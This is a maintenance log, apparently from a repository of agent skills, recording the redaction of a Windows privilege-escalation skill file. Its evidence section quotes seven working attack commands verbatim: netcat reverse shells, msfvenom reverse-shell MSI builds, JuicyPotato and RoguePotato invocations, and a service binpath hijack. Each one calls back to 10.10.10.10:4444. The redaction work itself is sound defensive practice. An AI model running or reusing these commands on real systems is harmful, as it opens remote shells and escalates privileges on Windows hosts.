# 2026-04-02: windows-privilege-escalation Maintenance Run

## Target
`skills/windows-privilege-escalation`

## Why it was selected
The skill `skills/windows-privilege-escalation` is an unclaimed high-risk skill containing active malicious payloads, such as netcat reverse shells and MSFVenom payloads, which need to be hardened by being redacted.

## Evidence Reviewed
The file `skills/windows-privilege-escalation/SKILL.md` was found to contain the following malicious payloads directly in the text:
* `C:\nc.exe -e cmd.exe 10.10.10.10 4444`
* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi`
* `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *`
* `RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999`
* `sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"`
* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi`
* `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`

## Files Changed or Removal Decision
- Changed: `skills/windows-privilege-escalation/SKILL.md` (Redacted the active payloads, replacing them with placeholders like `[REDACTED_NC_PAYLOAD]` and `[REDACTED_MSFVENOM_PAYLOAD]`)
- Changed: `data/maintenance/ledger.json` (Updated status for `windows-privilege-escalation`)

## Linked PR or Issue
`PR-windows-privilege-escalation-hardening`

## Next Action
Monitor the skill for any re-introduction of active malicious payloads in future updates.
